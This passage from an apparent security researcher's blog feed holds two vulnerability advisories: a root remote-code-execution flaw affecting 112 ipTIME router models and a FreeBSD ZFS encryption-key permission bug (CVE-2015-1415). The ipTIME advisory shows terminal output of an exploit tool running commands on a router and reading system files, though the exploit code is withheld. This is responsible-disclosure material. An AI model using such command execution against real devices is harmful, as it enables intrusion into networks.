ipTIME g204
ipTIME g501
ipTIME g504
ipTIME ipsmart
ipTIME mini
ipTIME mobap1
ipTIME multi
ipTIME n1
ipTIME n104
ipTIME n104a
ipTIME n104ar1
ipTIME n104i
ipTIME n104k
ipTIME n104ktt
ipTIME n104m
ipTIME n104p
ipTIME n104q
ipTIME n104r
ipTIME n104r3
ipTIME n104rsk
ipTIME n104s
ipTIME n104sr1
ipTIME n104t
ipTIME n104v
ipTIME n104vlg
ipTIME n1e
ipTIME n1eky
ipTIME n1p
ipTIME n2
ipTIME n2e
ipTIME n2p
ipTIME n3004
ipTIME n5
ipTIME n5004
ipTIME n504
ipTIME n5r1
ipTIME n6004
ipTIME n6004m
ipTIME n6004r
ipTIME n604
ipTIME n604a
ipTIME n604i
ipTIME n604m
ipTIME n604p
ipTIME n604r
ipTIME n604s
ipTIME n604t
ipTIME n604v
ipTIME n604vlg
ipTIME n608
ipTIME n7004ns
ipTIME n702bcm
ipTIME n704
ipTIME n704a
ipTIME n704a3
ipTIME n704bcm
ipTIME n704lg
ipTIME n704m
ipTIME n704mlg
ipTIME n704ns
ipTIME n704s
ipTIME n704v
ipTIME n704v3
ipTIME n8004
ipTIME n8004r
ipTIME n8004v
ipTIME n804
ipTIME n804a
ipTIME n804a3
ipTIME n804t
ipTIME n804t3
ipTIME n804v
ipTIME n904
ipTIME n904ns
ipTIME n904v
ipTIME ng104
ipTIME ng304
ipTIME ntq104
ipTIME ntv108
ipTIME ntv116
ipTIME ntv124
ipTIME q1
ipTIME q304
ipTIME q504
ipTIME q604
ipTIME t1004
ipTIME t1008
ipTIME t16000
ipTIME t2008
ipTIME t24000
ipTIME t3004
ipTIME t3008
ipTIME timeve
ipTIME tq204
ipTIME tv104
ipTIME v1016
ipTIME v1024
ipTIME v304
ipTIME v308
ipTIME v504
ipTIME wre1
ipTIME x3003
ipTIME x3007
ipTIME x5007
ipTIME x6003
</code></pre>
<p>You can download firmwares here: <a href="http://download.iptime.com/download/router/">http://download.iptime.com/download/router/</a></p></content>
    </entry>
    
    <entry>
        <title>112 ipTIME Routers/WiFi APs/Modems/Firewalls models vulnerable with RCE with root privileges</title>
        <link href="2015-04-20-112-iptime-routers-wifiaps-modems-firewalls-models-vulnerable-with-RCE-with-root-privileges.html"/>
        <content type="html"><pre><code> -----BEGIN PGP SIGNED MESSAGE-----
 Hash: SHA512

 ## Advisory Information

 Title: 112 ipTIME Routers/WiFi APs/Modems/Firewalls models vulnerable with RCE with root privileges
 Advisory URL: https://pierrekim.github.io/advisories/2015-iptime-0x00.txt.asc
 Date published: 2015-04-17
 Vendors contacted: KrCERT, ipTIME
 Release mode: Released
 CVE: no current CVE



 ## Product Description

 EFMNetworks ipTIME is the largest Korean brand of SOHO/small/middle entreprise Routers/WiFi APs/Modems/Firewalls in South Korea
 with millions of devices deployed in the country. EFMNetworks ipTIME is occupying more than 60 percent of personal network devices.
 There are =~ 10 000 000 of ipTIME devices deployed in South Korea.



 ## Vulnerability Summary

 This vulnerability allows to bypass the admin authentication and to get a direct RCE as root from the LAN side with a single HTTP request.

 This is a direct RCE against the Routers/WiFi APs/Modems/Firewalls which gives a complete root access to the embedded Linux from the LAN side.
 The exploit doesn't work by default from the WAN (no HTTP or UPNP access from the WAN by default unless activated).
 If enabled on the WAN, the remote admin interface exposes the devices to this vulnerability.

 It affects 112 ipTIME products from 2009-era firmwares to the 9.52 firmware (built time 2015-03-23)) with the default configuration:


 - ipTIME A5004NS
 - ipTIME A3004NS
 - ipTIME A3004
 - ipTIME A2004NS
 - ipTIME A2004NSplus
 - ipTIME A2004
 - ipTIME A2004plus
 - ipTIME A2008
 - ipTIME A1004
 - ipTIME A1004V
 - ipTIME A104
 - ipTIME A104NS
 - ipTIME N6004R
 - ipTIME N8004R
 - ipTIME N8004V
 - ipTIME N8004
 - ipTIME N804A3
 - ipTIME N804T3
 - ipTIME N904
 - ipTIME N904plus
 - ipTIME N904V
 - ipTIME N904Vplus
 - ipTIME N704V3
 - ipTIME N704BCM
 - ipTIME N704A3
 - ipTIME N604S
 - ipTIME N604A
 - ipTIME N104S-r1
 - ipTIME Smart
 - ipTIME N904NS
 - ipTIME N704NS
 - ipTIME N604T
 - ipTIME N604Tplus
 - ipTIME N7004NS
 - ipTIME N104V
 - ipTIME N604V
 - ipTIME N604Vplus
 - ipTIME N604R
 - ipTIME N604Rplus
 - ipTIME N604plus
 - ipTIME N104R
 - ipTIME N104Q
 - ipTIME N104plus
 - ipTIME N104K
 - ipTIME N5
 - ipTIME N2plus
 - ipTIME N1plus
 - ipTIME N1E
 - ipTIME N804V
 - ipTIME N804T
 - ipTIME N804A
 - ipTIME N804
 - ipTIME N2E
 - ipTIME N2Eplus
 - ipTIME N104A
 - ipTIME N104S
 - ipTIME N104i
 - ipTIME N1
 - ipTIME N104
 - ipTIME N104M
 - ipTIME N504
 - ipTIME N604i
 - ipTIME N604M
 - ipTIME N608
 - ipTIME N704
 - ipTIME N704A
 - ipTIME N704M
 - ipTIME N704S
 - ipTIME N704V
 - ipTIME N3004
 - ipTIME N5004
 - ipTIME N6004
 - ipTIME N6004M
 - ipTIME N104T
 - ipTIME N5-r1
 - ipTIME N104-r3
 - ipTIME WR-E1
 - ipTIME Mini
 - ipTIME MobileAP1
 - ipTIME Multi
 - ipTIME Extender2
 - ipTIME G1
 - ipTIME G104
 - ipTIME G104BE
 - ipTIME G104M
 - ipTIME G204
 - ipTIME G304
 - ipTIME G504
 - ipTIME G504
 - ipTIME G104i
 - ipTIME G104A
 - ipTIME Q604
 - ipTIME V304
 - ipTIME T3004
 - ipTIME T3008
 - ipTIME T16000
 - ipTIME T24000
 - ipTIME Q1
 - ipTIME Q104
 - ipTIME Q204
 - ipTIME Q304
 - ipTIME Q504
 - ipTIME V104
 - ipTIME V108
 - ipTIME V308
 - ipTIME V116
 - ipTIME V124
 - ipTIME V1024
 - ipTIME V1016
 - ipTIME T1004
 - ipTIME T1008
 - ipTIME X3003
 - ipTIME X3007
 - ipTIME X5007
 - ipTIME X6003


 Concerning the high CVSS score (10/10) of the vulnerability, the number of affected devices and the longevity of this vulnerability (6+ year old), we urge users to apply the new 9.58 firmware.



 ## Details

 The HTTP server allows the attacker to execute some CGI files.

 Many of them are vulnerable to a command inclusion which allows to execute commands with the http daemon user rights (root).


 root@kali:~/iptime# ./iptime.carnage 192.168.0.1 cat /var/run/hwinfo
 company_name=EFM Networks
 product_name=ipTIME N604V
 url=www.iptime.co.kr
 max_vlan=5
 mirror_port=1
 num_lan_port=4
 lan_port_swap=1
 max_port=5
 wan_port=5
 firmup_duration=100
 reboot_duration=40
 max_wds=4
 max_macauth=32
 wireless_ifname=eth0
 wan_ifname=eth2.2
 local_ifname=br0
 br0_port=eth2.1,eth0
 port_diag=1
 flash_diag_dev=/dev/mtd
 bootloader_size=0x10000
 max_firmware_size=0x200000
 save_flash_offset=0x10000
 save_flash_size=0x10000
 flash_sector_size=0x10000
 max_syslog=400
 ip_conntrack_max=8192
 udp_conntrack_max=4096
 icmp_conntrack_max=1024
 auth_server=auth2.efm-net.com
 wan_ifidx=5
 language=kr
 product_alias=n604v
 root@kali:~/iptime# ./iptime.carnage 192.168.0.1 cat /home/http/build_date
 Mon Mar 23 14:54:50 KST 2015
 root@kali:~/iptime#


 Considering the huge potential impact against the South Korea networks, we are not currently planning to release working exploits.



 The exploits will be posted on my blog located at https://pierrekim.github.io/blog/


 ## Vendor Response

 The vendor has released a new firmware version (9.58) for 112 devices:

 http://iptime.com/iptime/?uid=16202&amp;mod=document&amp;page_id=16



 ## Report Timeline

 * Jun 01, 2014: Vulnerability found by Pierre Kim and Alexandre Torres.
 * Mar 24, 2015: Vulnerability confirmed on all the existing versions from 2009 to 2015 including the last firmware version.
 * Apr 07, 2015: KRCERT is notified of the vulnerability using the FIRST dedicated email.
 * Apr 08, 2015: Pierre Kim tries to contact KRCERT using http://eng.krcert.or.kr/contactus/contact.jsp : this form doesn't work (nor &lt;form&gt;, nor JS for form-submission).
 * Apr 08, 2015: Vendor is contacted (security@iptime.com) to provide a valid GPG key.
 * Apr 08, 2015: Email sent to security@iptime.com is bounced.
 * Apr 08, 2015: Vendor is contacted (support@iptime.com) for a GPG key.
 * Apr 09, 2015: KRCERT is contacted (cert@krcert.or.kr - support email) for a GPG key.
 * Apr 09, 2015: vuln@krcert.or.kr is contacted.
 * Apr 09, 2015: KISA is contacted for a GPG key at http://www.kisa.or.kr/eng/contactUs/contactUs.jsp:  400 Bad Request or alert box saying the message was malformed.
 * Apr 09, 2015: KISA is contacted using Twitter (https://twitter.com/PierreKimSec/status/585986016294674433).
 * Apr 09, 2015: FIRST KRCERT answered asking for information about the vulnerabilites and agreed to contact ipTIME to develop a security patch as soon as possible.
 * Apr 09, 2015: 2 POCs are sent to FIRST KRCERT by email.
 * Apr 13, 2015: FIRST KRCERT confirms the POCs work and said they can't assign CVE. They ask a 90 days disclosure policy to allow ipTIME to work on this issue and asks if we can disclose the vulnerabilities details after a patch is released.
 * Apr 13, 2015: MITRE is contacted asking for a CVE number.
 * Apr 13, 2015: FIRST KRCERT is contacted : we agree on the 90 days vulnerability disclosure policy. We ask which models are vulnerable.
 * Apr 14, 2015: vuln@krcert.or.kr replies with one vulnerable model. The vulnerability information is sent to ipTIME and we have to use vuln@krcert.or.kr as a contact address now.
 * Apr 15, 2015: vuln@krcert.or.kr is contacted for a GPG key concerning other vulnerabilities found in ipTIME products.
 * Apr 16, 2015: Vendor releases 112 new firmwares.
 * Apr 16, 2015: vuln@krcert.or.kr is contacted to know if this new firmware fixes the vulnerabilities we reported. The vendor advisory specifies only "User Interface-related security" in Korean (thank you Google Translate).
 * Apr 16, 2015: From our tests, the vulnerabilities have been fixed.
 * Apr 17, 2015: A public advisory is sent to security mailing lists.



 ## Credit

 This vulnerability was found by Alexandre Torres and Pierre Kim (@PierreKimSec).



 ## Greetings

 Big thanks to my friend working at YongSan, specialized in server hardware and alcohol, which gave me for free an ipTIME X3003 which resulted this complete pownage.



 ## References

 http://iptime.com/iptime/?uid=16202&amp;mod=document&amp;page_id=16
 https://pierrekim.github.io/advisories/2015-iptime-0x00.txt.asc



 ## Disclaimer

 This advisory is licensed under a Creative Commons Attribution Non-Commercial
 Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/




 -----BEGIN PGP SIGNATURE-----
 Version: GnuPG v1

 iQIcBAEBCgAGBQJVMHSPAAoJEMQ+Dtp9ky28/5gP/3xaajDhO5Y/u8PkegkGJ4bZ
 63tbiOAh2CiioWzwQXhgPUVqCua8Fh+SFqrrwf1j3klZtiNPR8ThUiQC1efE9q2+
 Q8oc4KMpb0Ysf+HuFBAU7mdqNZazZukAOTttDMSProap72D5QkqzRrWEiYk5Lk/9
 R5/rj94iEZ3ZM3gZkFp1HHSKvkfTXdZdwxv4r2bq3URxqmUnj3aZ/ITmqxLEYEgT
 ufjoaGXodffnNJZNyhFpnIMgK6DZvs8/WdH2+zCKsCltru7ou2biBD1m0LIbYli4
 tCUOzgUQ+FlR7KDmUmBWhtVQodKsWdOSnDJKnyjvLueS1YCGBLMuMiNnbtdmYU8Z
 qdFmAEnSysrxWupk+sPZkcxrzI/8eIbON937JrrCzTaE7jNNgTyhW1AwmDqMDpqe
 pWfPogBRZ1LpUSiOC++zFkkayVMVyhOmqDttrRMhCzW7bCuM9dmPBfBTjqiq6luZ
 HRofLYmG7PBtqCwEJi+AMzWydCJgnOEq2d26AK2BoDK2PuBfGG5Rg47HC82lNOsR
 0mejdpCYJXBw30YjMG5O3cH1PjlG5JfVYXsHmaFTfvN9Omz8xJZBY2528e4gNCOS
 SkyGa4CFJ/QF6N+3kgc5AWpjuvAdtfqINBK2OShNdASGHC+Z4Eyj9J+eaXvu8g7J
 k6tQ5BWKb21foIfsrYyT
 =XTn6
 -----END PGP SIGNATURE-----
</code></pre></content>
    </entry>
    
    <entry>
        <title>CVE-2015-1415</title>
        <link href="2015-04-08-cve-2015-1415.html"/>
        <content type="html"><pre><code>-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

## Advisory Information

Title: FreeBSD 10.x ZFS encryption.key disclosure (CVE-2015-1415)
Advisory URL: https://pierrekim.github.io/advisories/CVE-2015-1415.txt.asc
Date published: 2015-04-07
Vendors contacted: FreeBSD
Release mode: Coordinated release



## Product Description

FreeBSD is a UNIX-like operating system.



## Vulnerability Summary

FreeBSD 10.x installer supports the installation of FreeBSD 10.x  on  an
encrypted ZFS filesystem by default.

When using the encryption system within ZFS during the  installation  of
FreeBSD 10.0 and FreeBSD 10.1, the encryption.key has wrong  permissions
which allow local users to read this file.

Even if the keyfile is passphrase-encrypted, it can present a risk.



## Details

By default, the encryption key file is /boot/encryption.key.

Instead of being 0600, the permissions are 0644:

$ ls -la /boot/encryption.key
- -rw-r--r--  1 root  wheel  4096 Feb 17 15:16 /boot/encryption.key
$

This file is readable by a local user.



## Vendor Response

According to the vendor, a security advisory will be published, describing
the problem and the solution. It concerns:

    - stable/10, 10.1-STABLE
    - releng/10.1, 10.1-RELEASE-p8
    - releng/10.0, 10.0-RELEASE-p18


## Report Timeline

 * Mar 01, 2015: Problem found by Pierre Kim
 * Apr 01, 2015: Vendor is notified of the vulnerability
 * Apr 01, 2015: Vendor confirms report and indicates a fix is  prepared
   but there will be no security advisory format notification because of
   the nature of the problem
 * Apr 02, 2015: Pierre Kim asks a CVE number to the vendor
 * Apr 02, 2015: Vendor indicates to use CVE-2015-1415  and  confirms that a
   signed notification to the mailing lists will be sent.
 * Apr 03, 2015: Pierre Kim contacts FreeBSD about the future notification
 * Apr 04, 2015: Vendor confirms a security advisory will be published
   next week
 * Apr 07, 2015: Vendor publishes a security advisory (FreeBSD-SA-15:08)
 * Apt 07, 2015: This advisory is sent to bugtraq@



## Credit

This vulnerability was found by Pierre Kim (@PierreKimSec).



## References

https://www.freebsd.org/doc/handbook/bsdinstall-partitioning.html
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1415
https://www.freebsd.org/security/advisories/FreeBSD-SA-15:08.bsdinstall.asc



## Disclaimer

This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBCAAGBQJVJF22AAoJEMQ+Dtp9ky28NDgP/iW9YALiZKLPVhnShFEhFO4C
SvSza1s7LJkhtOH8qOGplzTrn8wSV5BNhwzMaIaKpksP5RjoCkynxvAw/OncazPl
tsfHM89m7bQ4puyXF3eb6lMkfaIkxoDAXM5R5DFb2Q+3wg4SDygdM7+BQEdqCXDV
2B+ZNGae2CcsqLq04zjskFgY2bwqNMyX3GbbmUJvVI5IXQIS30e1lVIq8zxcK7u0
lKFlVyp+gdyusenPz0lCqR82Pe1IA3tHuNn2zw3/EudT4VhD789/t/0lEWlSyNg7
uiTCqFpQXnpEnvXEez1gZiDuNccIMXXYv0agB+/mYkkoviQPk5jqCwI5rvs+ppFU
IH0gAafqS/UIl5+/dhDdIVDA4+r4WWLUxJfFkDy4ThCQHZtZMCsBYk3/RNJBPDUW
JiVZWV8LSSHtYfWj7YoiCswuC9FLp6CT9e+/XQUJjpNrwfpeT5KlFOCFUKQXwV6W
5nUJnQhjVfrXVjeRuOvMCInSwG8DWbfyX75QMmJNyV7aPMrS2prRXbOlTLuQUyzP
cJkmToeO4XE4COV+jvtC+c39Booy3r8yp3lfHmz1NXffiv6Ua+11vLamUeYOVPew
r4TmionPpSeAx3ODhKEKGjW+HIkl9sx3WcSnEBl88Aqd3Zv77G3ok4usFz4PvPnb
/hnH/lhpePtv13jyZpXc
=pOPH
-----END PGP SIGNATURE-----
</code></pre></content>
    </entry>
    
    <entry>
        <title>Annyeong haseyo!</title>
        <link href="2015-04-07-annyeong-haseyo.html"/>
        <content type="html"><p>Annyeong haseyo!</p>
<p>I will use this blog to post fun things about IT security and kimchi.</p></content>
    </entry>
    
</feed>